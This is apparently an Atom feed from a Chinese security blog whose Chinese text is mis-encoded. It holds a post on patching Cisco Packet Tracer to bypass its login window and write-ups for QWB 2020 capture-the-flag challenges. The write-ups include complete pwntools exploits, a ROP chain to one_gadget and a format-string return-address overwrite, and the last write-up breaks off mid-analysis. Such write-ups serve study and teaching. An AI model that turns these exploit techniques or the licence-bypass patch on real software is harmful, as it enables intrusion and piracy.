<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿï¼</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-09-08T14:21:35.771Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£</title>
    <link href="http://chumen77.xyz/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <id>http://chumen77.xyz/2020/09/07/å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£/</id>
    <published>2020-09-07T09:11:40.744Z</published>
    <updated>2020-09-08T14:21:35.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£"><a href="#å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£" class="headerlink" title="å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£"></a>å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¸“ä¸šè¯¾å¼€è®¾äº†è·¯ç”±äº¤æ¢è¿™é—¨è¯¾ï¼Œå…¶ä¸­è¦ç»å¸¸ä½¿ç”¨packet tracerè¿™ä¸ªè½¯ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æ³¨å†Œçš„è¯ï¼Œæ¯æ¬¡ç™»é™†éƒ½éœ€è¦ç­‰å¾…15sï¼Œå°±å°è¯•ç ´è§£ä¸€ä¸‹ã€‚</p><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><p>ç ´é™¤ç­‰å¾…çš„15sï¼Œæœ€å¥½ç›´æ¥å»é™¤æ‰ç™»é™†çª—å£ã€‚ä½†æ˜¯è€å¸ˆä¸Šè¯¾ç»™æˆ‘ä»¬æ¼”ç¤ºè¿‡ï¼Œæœ‰ä¸ªå¾çˆ±ç ´è§£çš„æ’ä»¶æ˜¯ç›´æ¥ç ´è§£æ‰ç™»é™†çª—å£çš„ï¼Œå°±ç›´æ¥å¥”ç€è¿™ä¸ªç›®æ ‡å»ã€‚</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><ul><li>win7 æ¨¡æ‹Ÿå™¨</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="ç ´è§£è¿‡ç¨‹è®°å½•"><a href="#ç ´è§£è¿‡ç¨‹è®°å½•" class="headerlink" title="ç ´è§£è¿‡ç¨‹è®°å½•"></a>ç ´è§£è¿‡ç¨‹è®°å½•</h2><h3 id="å¯»æ‰¾çªç ´å£"><a href="#å¯»æ‰¾çªç ´å£" class="headerlink" title="å¯»æ‰¾çªç ´å£"></a>å¯»æ‰¾çªç ´å£</h3><p>ï¿¼åœ¨å¼¹å‡ºç™»é™†ç•Œé¢æ—¶ï¼Œæœ€ä¸Šæ–¹ä¼šæœ‰ <code>netacad.com Login</code>çš„å­—çœ¼ï¼Œå…ˆå°±é€‰æ‹©è¿™é‡Œä½œä¸ºå…³é”®å­—ç¬¦ä¸²ã€‚<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>åœ¨è¿™ä¸ªexeçš„ç¨‹åºä¸‹æœç´¢å­—ç¬¦ä¸²ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>ç«¯å£å¯ç–‘å­—ç¬¦ä¸²å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>ç„¶åå¼€å§‹f9ä¸€ç›´è¿è¡Œï¼Œåœ¨è¿™ä¸ª<code>netacad.com Login</code>ï¼Œè¿è¡Œå…¶åçš„è½¯ä»¶ä¼šå‘ç°ï¼Œçš„ç¡®å¼€å¯äº†ç™»é™†çš„çª—å£ã€‚è¿™æ ·å°±å¯ä»¥ç¡®å®šï¼Œå…³é”®å¤„å°±åœ¨è¿™é‡Œã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>å‘ä¸‹çœ‹å¯ä»¥çœ‹åˆ°ï¼Œä¸€äº›ç™»é™†å¤±è´¥çš„å­—ç¬¦ä¸²ï¼Œé‚£å°±æ— ç–‘æ˜¯è¿™ä¸€å—çš„å‡½æ•°æ§åˆ¶ç€è¿™ä¸ªç™»é™†çª—å£ã€‚</p><p>å‘ä¸Šçœ‹å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å‡ ä¸ªå°è·³è½¬ï¼Œå’Œä¸€ä¸ªå¤§è·³è½¬ï¼Œç„¶åè¿½è¿‡å»å¯ä»¥å‘ç°ï¼Œæ˜¯å¯ä»¥ç»•è¿‡è¿™äº›å…³é”®å‡½æ•°çš„ã€‚é‚£å°±å¾ˆç®€å•äº†ï¼Œå°è¯•æ”¹æˆ<code>jmp</code> æ— æ¡ä»¶è·³è½¬ä¸€ä¸‹è¯•ä¸€è¯•ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" alt></p><p>ç„¶åç›´æ¥è¿è¡Œä¸€ä¸‹ï¼Œç„¶åçš„ç¡®æ˜¯æˆåŠŸäº†ï¼Œå»æ‰äº†ç™»é™†æ¡†ã€‚</p><p>ç„¶åè¿›è¡Œä¿å­˜è¡¥ä¸ï¼Œæ›¿æ¢ä¸»ç¨‹åºå³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>çš„ç¡®æ˜¯æ‰¾åˆ°äº†å…³é”®å¤„ï¼Œæ„Ÿè§‰æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œç”±äºå‰äººç»éªŒå°±æ˜¯ä»ç™»é™†ç•Œé¢ä¸‹æ‰‹çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ç›´æ¥è·Ÿéšè¿™ä¸ªæ€è·¯æ“ä½œã€‚åœ¨å®Œå·¥ä»¥åï¼Œå°è¯•å»æä¸€ä¸‹15så“ªé‡Œçš„éªŒè¯ï¼Œæƒ³ç‚¹ä¸€ä¸‹ç›´æ¥å˜ä¸º0sï¼Œå¯ä»¥ç‚¹å‡»ç¡®è®¤ï¼Œå‘ç°æ˜¯çš„ç¡®éº»çƒ¦ä¹Ÿæ²¡æœ‰æˆåŠŸå°±æ”¾å¼ƒäº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£&quot;&gt;&lt;a href=&quot;#å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£&quot; class=&quot;headerlink&quot; title=&quot;å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£&quot;&gt;&lt;/a&gt;å®æˆ˜å»é™¤æ€ç§‘packet trac
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®</title>
    <link href="http://chumen77.xyz/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/24/å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®/</id>
    <published>2020-08-24T02:34:05.216Z</published>
    <updated>2020-09-09T02:08:22.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®"><a href="#å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®"></a>å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code>   Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)</code></pre><p>åŸºæœ¬ä¿æŠ¤ä¸ç®—å¤šã€‚</p><p>æ˜¯ä¸€ä¸ªä¼ªå †é¢˜ã€‚</p><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>åœ¨ <code>leave_message(v1)</code>å‡½æ•°è¿™é‡Œçš„v1ä¸Šæ¥å–å€¼å°±æ˜¯16</p><pre><code class="c">__int64 __fastcall leave_message(unsigned int a1){  int v1; // ST14_4  __int64 v3; // [rsp+18h] [rbp-8h]  puts(&quot;message: &quot;);  v1 = read(0, &amp;v3, a1);  strncpy(buf, (const char *)&amp;v3, v1);  buf[v1] = 0;  puts(&quot;done!\n&quot;);  return 0LL;}</code></pre><p>è¿›å…¥ä»¥åå¯ä»¥å‘ç°ï¼Œv3æ˜¯åªæœ‰8å­—èŠ‚å¤§å°çš„ï¼Œå¯ä»¥æº¢å‡º8å­—èŠ‚ï¼Œå¯ä»¥è¦†ç›–åˆ°rbpã€‚</p><h5 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h5><pre><code>.text:0000000000400985 ; 22:         if ( v1 &gt; 256 ).text:0000000000400985                 cmp     [rbp+var_4], 100h.text:000000000040098C                 jle     short loc_400995.text:000000000040098E ; 23:           v1 = 256;.text:000000000040098E                 mov     [rbp+var_4], 100h.text:0000000000400995 ; 24:         leave_message(v1);</code></pre><p>åœ¨è¿›å…¥<code>leave_message(v1)</code>å‰v1æœ‰ä¸€ä¸ªå¯¹äº0x100å¤§å°çš„åˆ¤æ–­ï¼Œè¦æ˜¯v1å¤§äº0x100å°±ç»™è®¾ç½®ä¸º0x100ã€‚è¿™å°±å¯ä»¥å®ç°æ ˆæº¢å‡ºï¼Œè¿›è¡Œropã€‚</p><p>æ€ä¹ˆæ§åˆ¶v1ï¼š</p><pre><code>signed int v1; // [rsp+Ch] [rbp-4h]</code></pre><p>å¯ä»¥æ˜æ˜¾çœ‹åˆ°v1åœ¨rbp-4çš„åœ°å€ï¼Œç„¶årbpï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºè¦†ç›–ï¼Œè¦†ç›–åˆ°åˆé€‚çš„åœ°æ–¹åï¼Œä¿éšœ-4åï¼Œæœ‰ä¸ªintå¤§å°çš„å¤§äºç­‰äº0x100çš„å€¼å³å¯ã€‚</p><p>è¿™ä¸ªåˆé€‚åœ°å€ï¼Œå¯ä»¥ä»<code>leave_name()</code> ä¸‹æ‰‹ï¼Œå› ä¸ºå…¶å¾€bssæ®µè¯»äº†å€¼ã€‚</p><pre><code>byte_6010D0[(signed int)read(0, byte_6010D0, 4uLL)] = 0;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><ul><li>æ„é€ ropé“¾ï¼Œæ³„æ¼å‡ºlibcçš„åœ°å€ï¼Œè¿”å›startï¼Œè®©ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œæ¸…ç†æ ˆ</li><li>å†æ¬¡åˆ©ç”¨ï¼Œæ§åˆ¶ret address ä¸º<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./babymessage&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,21342)    libc = elf.libc    libc = ELF(&#39;./libc-2.27.so&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400ac3start = 0x04006E0sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)sla(&#39;choice&#39;,&#39;2&#39;)rop = flat([pop_rdi,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],start])payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)ru(&#39;done!&#39;)r(2)libc_base = uu64(r(6)) - libc.sym[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)# debug()payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)rec = 0x10a45c + libc_basesla(&#39;choice&#39;,&#39;2&#39;)rop = p64(rec)payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)itr()</code></pre><pre><code class="python">flag{f4c1c2c2407055f2665dec486e7d1b16}</code></pre><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚æ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ— é™æ¬¡è§¦å‘ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><pre><code class="c">signed __int64 __fastcall sub_1212(const char *a1){  char *v2; // [rsp+18h] [rbp-128h]  char s; // [rsp+20h] [rbp-120h]  unsigned __int64 v4; // [rsp+138h] [rbp-8h]  v4 = __readfsqword(0x28u);  v2 = strstr(a1, &quot;Remind me to &quot;);  if ( !v2 )    return 0LL;  memset(&amp;s, 0, 0x110uLL);  sprintf(&amp;s, &quot;&gt;&gt;&gt; OK, I&#39;ll remind you to %s&quot;, v2 + 13);  printf(&amp;s);  puts(&amp;::s);  return 1LL;}</code></pre><p>å‘ç°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä½ æ‰€è¾“å…¥çš„éƒ½ä¼šè¢«sprintfå¤„ç†ä»¥åç»™printfå‡½æ•°ã€‚ç”±äºå…¶æ˜¯<code>%s</code>æ¥å¤„ç†æ•°æ®ï¼Œè¿™å°±è®©ç›´æ¥åœ¨æ ˆä¸Šå†™åœ°å€ï¼Œç„¶åæ”»å‡»é€ æˆäº†éš¾åº¦ã€‚<br>ä½†æ˜¯è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå…¶å®è¾“å…¥çš„ä¸œè¥¿è¿˜ä¼šä¿ç•™åœ¨æ ˆä¸Šï¼Œå› ä¸ºsprintfå¤„ç†æ•°æ®ä¹Ÿæ˜¯ä»æ ˆä¸Šæ‹¿çš„ï¼Œæ‰€ä»¥ä¼šè¢«ä¿ç•™çš„ã€‚</p><h4 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h4><ul><li>ç¬¬ä¸€æ¬¡è§¦å‘ï¼Œæ³„æ¼å‡ºlibcåœ°å€ï¼Œstackåœ°å€ã€‚</li><li>æ‰§è¡Œåˆ°printfå‡†å¤‡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œç”¨sprintfæ®‹ç•™æ ˆä¸Šçš„æ•°æ®ï¼ˆåœ¨0x100åï¼‰ï¼Œè¿™ä¸ªéœ€è¦ç²¾å¿ƒæ„é€ å¥½åï¼Œè¿›è¡Œæ”»å‡»ret addressã€‚éœ€è¦ä¸€æ¬¡æ€§æ”¹å¥½ã€‚</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,12124)    # libc = elf.libc    libc = ELF(&#39;./libc.so.6&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def start_attc():    sla(&#39;&gt;&gt;&#39;,&#39;Hey Siri!&#39;)    r()a = &#39;Remind me to &#39;start_attc()payload = str(a) + &#39;%83$p&#39; + &#39;bbb&#39; + &#39;%7$p&#39;# ru(&#39;&gt;&gt;&gt;&#39;)s(payload)ru(&#39;0x&#39;)libc_base = int(r(12),16) - 0x21b97info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;bbb0x&#39;)stack_base = int(r(12),16) - 0x150info_addr(&#39;stack_base&#39;,stack_base)tag = stack_base + 0x148start_attc()def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 27fmtpayload = &quot;&quot;key = 0x4f365 + libc_baseinfo_addr(&#39;key&#39;,key)for i in range(3):    fmtpayload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,55+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffprint(fmtpayload)payload = str(a) + fmtpayloadpayload +=&#39;aaa&#39; + &#39;b&#39; + p64(tag)[0:6] + &#39;\x00&#39;*2 + p64(tag+2)[0:6] + &#39;\x00&#39;*2  + p64(tag+4)[0:6] + &#39;\x00&#39;*2 + p64(tag+6)[0:6] + &#39;\x00&#39;*2s(payload)itr()</code></pre><pre><code class="python">flag{da8836b9e9df3db44fe4bd7f39d4f7ab}</code></pre><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Idaåç¼–è¯‘åçš„ä»£ç æ¯”è¾ƒéš¾çœ‹ï¼Œå‘ç°é‡ç‚¹æ•°æ®é€ æˆäº†å›°éš¾ï¼Œå°±é‡‡å–åŠ¨æ€è°ƒè¯•ã€‚</p><p>åŸºæœ¬æµç¨‹å°±æ˜¯ï¼Œgetsä¸€æ®µä½ è¾“å…¥çš„flagï¼Œè¯»å…¥åç”¨<code>sub_12f0_</code>è¿›è¡Œå¤„ç†ï¼Œç„¶åç»™<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸ªå­—ç¬¦æ¥è¿›è¡Œå¯¹æ¯”ã€‚</p><h3 id="sub-12F0-åŠ å¯†å‡½æ•°"><a href="#sub-12F0-åŠ å¯†å‡½æ•°" class="headerlink" title="sub_12F0_åŠ å¯†å‡½æ•°"></a><code>sub_12F0_</code>åŠ å¯†å‡½æ•°</h3><pre><code class="python">_BYTE *__fastcall sub_12F0(_BYTE *a1){  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm { endbr64 }  result = (_BYTE *)sub_1090();  if ( (signed int)result &lt;= 0 )    return result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - 1);  v4 = 0LL;  do  {    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % 7]) + 65;    v5 = v4++;  }  while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }  while ( v2 &gt; v6 );  return result;}</code></pre><p>åŠ¨æ€è°ƒè¯•ï¼Œè¿›è¡Œèµ·æ¥å¾ˆå®¹æ˜“çœ‹æ‡‚ã€‚ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªå¯¹è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªä¸<code>byte_4010</code>çš„å­—ç¬¦<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7ç»„æ¥è¿›è¡Œä¸€ä¸ªå¼‚æˆ–å’Œ+65ã€‚</p><p>ç„¶åä¸‹é¢ï¼š</p><pre><code class="python"> while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }</code></pre><p>åªçœ‹ç€è®©äººå¤´å¤§ï¼Œè¾“å…¥<code>flag{11111111111111111111111111111111111111111}</code> åŠ¨æ€è°ƒè¯•ä¸€ä¸‹å‘ç°ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>åˆ†æè¿™2ç»„æ•°æ®å°±ä¼šå‘ç°ï¼Œæ¯æ¬¡å¯¹4ä¸ªæ•°æ®ä¸ºä¸€ç»„è¿›è¡Œå¤„ç†ã€‚å¤„ç†åç»“æœå°±æ˜¯åŸæ¥çš„ï¼š <code>v1 &gt; v2 &gt; v3 &gt; v4</code> å˜ä¸º <code>v4 &gt; v1 &gt; v2 &gt; v3</code> è¿™æ ·çš„ç»“æœã€‚</p><p>ç„¶åå¤„ç†å®Œå°±ç»™<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚è¿™è‚¯å®šä¸ºä¸€ä¸²å¤„ç†è¿‡çš„å­—ç¬¦ä¸²ï¼Œidaä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œç›´æ¥æå–æœ‰ç‚¹å®³æ€•æå–é”™ï¼ŒåŠ¨è°ƒæ—¶æå–ä¸€ä¸‹å‡ºæ¥ï¼š</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]</code></pre><p>ä¹Ÿå°±æ˜¯è¿™ä¸€æ®µæ•°æ®ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>è‡ªå·±ç›´æ¥æ‰‹åŠ¨æ›¿æ¢çš„æ•°æ®ã€‚</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]tag2 = [0x78, 0x7C, 0x64,0x4C,0x55, 0x77, 0x65,0x54, 0x49,0x76, 0x4E,0x5C, 0x43, 0x42, 0x4F,0x68,0x71, 0x44, 0x4E,0x4C,0x57, 0x7D, 0x49,0x66, 0x46, 0x5A, 0x43,0x6D, 0x69,0x79, 0x78, 0x74, 0x5C, 0x50, 0x57, 0x4F,0x65, 0x62, 0x44,0x5E]qwkey = [&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;]flag = &#39;&#39;i = 0j = 0for i in range(len(tag2)):    if j ==7:        j = 0    flag += chr((tag2[i] - 65) ^ ord(qwkey[j % 7]))    j += 1print(str(flag))</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>ä¼°è®¡æ²¡æœ‰æå–å…¨ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“çŸ¥é“flagäº†ã€‚</p><pre><code class="python">flag{QWB_water_problem_give_you_the_score}</code></pre><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®æé†’äº†æ˜¯house of orangeï¼Œé‚£å°±æƒ³ç€è¿™æ ·åˆ©ç”¨å³å¯ã€‚ç°åœ¨house of orangeçš„æ€æƒ³ï¼Œç»ŸæŒ‡ä¸»è¦æ˜¯é’ˆå¯¹æ²¡æœ‰freeçš„å †é¢˜ï¼Œå…¶æ”¹top chunkï¼Œç„¶åç”³è¯·ä¸€ä¸ªå¤§ç‚¹çš„chunkï¼Œæ¥è¿›è¡Œè·å–ä¸€ä¸ªè¿›å…¥unsortbin çš„å †å—ã€‚æ²¡æœ‰å¦‚æœ€æ—©çš„å¾ˆç»å…¸çš„åˆ©ç”¨unsortbin attack å’Œ io ç»“åˆæ¥è·å–shellã€‚</p><p>é¢˜ç›®çš„case2 <code>Invite her to go to a movie.</code> ä¸­ï¼š</p><pre><code class="c">  printf(&quot;movie name &gt;&gt; &quot;, &amp;buf);            v4 = atoi((const char *)&amp;buf);            read(0, (void *)(qword_404060[v4] + 0x60), 0x10uLL);</code></pre><p>ç”±äºå…¶æ˜¯åœ¨åŠ 0x60ä¹‹åè¯»å–ï¼Œä¸”åœ¨case 1 åªæ˜¯malloc(0x68)ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„å¯ä»¥æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œæ”¹å†™åˆ° top chunkã€‚</p><p>å¹¶ä¸”case3ï¼š</p><pre><code class="c">  puts(&quot;You are the apple of my eyes too!&quot;);          qword_404098 = (__int64)malloc(0x1000uLL);          ++v12;</code></pre><p>å¯ä»¥ç»™ä½ ç”³è¯·0x1000çš„å †å—ï¼Œè¿™å°±å¯ä»¥å®ç°äº†house of orangeã€‚</p><p>åœ¨case5ä¸­ï¼š</p><pre><code class="c">  puts(&quot;\nHotaru: Won&#39;t you stay with me for a while? QAQ\n&quot;);        read(0, &amp;key, 8uLL);    </code></pre><p>ä¼šç»™<code>0x4040A0</code> è¯»ä¸€æ®µæ•°æ®ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>æ˜¯ç´§æŒ¨ç€å †å—çš„ã€‚ç„¶è€Œåœ¨case2ä¸­åœ¨editæ—¶ä¹Ÿæ²¡æœ‰å¯¹å †å—åºå·çš„æ£€æŸ¥,è®©ä¸ªäººè¾“å…¥ä¸ª8 å³å¯å–åˆ°è¿™é‡Œï¼Œè¿›è¡Œç¼–è¾‘ã€‚</p><h3 